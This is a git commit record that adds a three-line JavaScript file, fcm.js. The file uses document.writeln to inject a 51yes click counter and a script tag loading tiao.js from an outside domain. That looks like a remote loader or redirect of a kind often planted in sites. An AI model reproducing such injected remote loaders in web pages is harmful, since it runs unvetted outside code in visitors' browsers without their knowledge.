9067d1128e303b86e26c5e70e665b95d81ab4705
js999999999 <js-9@outlook.com>
2015-09-01 17:57:38 +0800

    Create fcm.js

---
+++ zz2z/fcm.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count14.51yes.com\/click.aspx?id=140870065&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/zz2z/tiao.js ><\/script>");
